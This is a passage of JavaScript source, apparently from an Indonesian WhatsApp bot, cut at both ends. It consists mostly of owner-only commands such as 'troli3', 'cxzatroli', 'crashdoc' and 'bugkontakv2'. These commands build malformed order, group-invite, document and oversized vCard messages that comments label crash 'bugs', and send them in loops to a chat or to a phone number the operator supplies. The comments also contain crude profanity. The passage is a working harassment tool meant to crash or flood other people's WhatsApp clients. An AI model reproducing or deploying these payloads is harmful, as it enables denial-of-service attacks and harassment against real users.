hmXJGSB61VbshF9Du1jvDFfSajJqVvdpDhoHYg7cZ8QxkHkZBqtqfY6S8u72V9StljubiK6dms90odNvhD7+E8PA8s/HNuDP5IluO2Mcck5bSL97SC/awadHjIaVWwAFLA8n4AZ61PJ2yNvDI0+nXqXqX0dk9kWjLBpBuQhgcEEEeYpr9moWs7i2+sMGbVjqmTDjHjDd3jdz0xu/CqvavQbqW5F3psjyTXesWdwdsO4W4jQIWPPiAxk9PT304J+SMkvbCDcqXWnT296t/DYSwSFS0Zl5R8gkFcc8VHf9qrWymv4jbTPJBex2aAOoEkki7xycBR15NQT9lbi5juri51JDq8t5DerMsBESNDwibN2SMZzz50L2avBDqjy6pby3N5cRXEqvZAwOANvdshYkqcDzB4FOB8jYdIuH1G0Mz2lxZursjRTqAcjzBHDKfIjg0VV7K6WNB0xrUzCUvK8xEamOOPcc7EXJwo9M0VVll1yZKJ2m7+GQ5VVBDedRW0hkQlsZBxxRRQkf/wCpAP8Adbc/v4z+gp1FFAJHg3AQgFXUgj4VLNbpHBMVLcgdTnoelFFAVbeRpYdzYB91WrSKNoY5e7UNjPHTPrRRQGNlv7hJWUsHX0ZRVmxdbk+OGJT6oMGiijBIo2s6jOFYgZOahuHKttGMSgK2fd6fOiigJ6KKKA//2Q=="
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
haikal.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
haikal.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
haikal.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
haikal.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
haikal.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
haikal.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
haikal.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
haikal.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
haikal.relayMessage(`${text}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
await m.reply(`Succes`)
}
break
case 'troli3': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlah?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
	var troli2 = generateWAMessageFromContent(m.chat,{
	"orderMessage": {
	"orderId": "599519108102353",
	"thumbnail": thumb,
	"itemCount": 1999,
	"status": "INQUIRY",
	"surface": "CATALOG",
	"message": " 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ",
	"orderTitle": " BUG TROLI ", // 
	"sellerJid": "6281349877456@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
	}
	},
	{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
	}, contextInfo:{}}) 
	haikal.relayMessage(m.chat, troli2.message, { messageId: troli2.key.id, a})
	}
	}
break
case 'buginvitev2':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (args.length == 0) return m.reply(`Jumlah?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
pc = generateWAMessageFromContent(m.chat,{
"groupInviteMessage": {
"groupJid": "120363047368062014@g.us", //Jan di ubh
"inviteCode": "CZ/GAeOhayYnqjcK", //Jan di ubh
"inviteExpiration": "99999999999",
"invitetime": "9999999999999999",
"groupName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${philips}️️`,
"jpegThumbnail": fs.readFileSync(`./pict.jpg`),//FIXED © 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 MD
"caption": `BUG INVITE 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH\n\n${philips}`,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, {quoted: {
	key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { //INI GUA KASIH QUOTED CRASH JANGAN DI GANTI 
liveLocationMessage: {
caption: `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
}
}
}, contextInfo:{}}) 
haikal.relayMessage(m.chat, pc.message, { messageId: pc.key.id,})
}
break
case 'cxzatroli':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (args.length == 0) return m.reply(`Jumlah?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
f = fs.readFileSync('./baseikal/virtex/virgam yg ganas.jpeg')
let troli = generateWAMessageFromContent(m.chat,{
"orderMessage": {
"orderId": "5287265358017580",//Dan kode ini jangan di ubh sedikit pun 
"thumbnail": thumb, 
"itemCount": 2030,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲",
"message":"© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲",
"sellerJid": "5491133536405@s.whatsapp.net",
"token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Kode ini jangan di ubh sedikit pun 
"totalAmount1000": "IDR 99.99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}//KODE YG SAMPING NYA GUA KASIH PERHATIAN JANGAN DI UBAH SOALNYA NGARUH LAINNYA BOLEH LU UBH

}, {quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "contactMessage": { 
"displayName": `${virtex2}`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;halah kontol;;;\nFN:${virtex1}\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:${virtex2}\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": f
}//👆👆👆BUG TROLI CARD GUA GABUNGIN BUG QUOTED KONTAK/VCARD CRASH HOME YG DULU PERNAH VIRAL 3 BUG KOMBINASI 🗿🗿🗿🗿🗿
}
}, contextInfo:{}}) 
haikal.relayMessage(m.chat, troli.message, { messageId: troli.key.id,})
}
break
	case 'sendtroli': {
	if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
a = await haikal.sendMessage(`${text}@s.whatsapp.net`, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
	var troli2 = generateWAMessageFromContent(m.chat,{
	"orderMessage": {
	"orderId": "599519108102353",
	"thumbnail": thumb ,
	"itemCount": 2030,
	"status": "INQUIRY",
	"surface": "CATALOG",
	"message": " 🎭 © 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 🎭",
	"orderTitle": " BUG TROLI ", // 
	"sellerJid": "6283131458282@s.whatsapp.net",
	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
	}
	},
	{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
	}, contextInfo:{}}) 
	haikal.relayMessage(`${text}@s.whatsapp.net`, troli2.message, { messageId: troli2.key.id, a})
	await m.reply(`Succes`)
	}
	break
case 'crashdoc':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
haikal.sendMessage(`${text}@s.whatsapp.net`, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${philips}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
	}
}
}})
await m.reply(`Succes`)
}
break
case 'bugkontakv2': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (args.length == 0) return m.reply(`Jumlah?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${philips}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲\nitem1.TEL:+6285814480623\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
haikal.sendContact(m.chat, global.ownerr, fkontaak)
}
}
break
case 'sendkontak': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${philips}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲\nitem1.TEL:+6285814480623\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 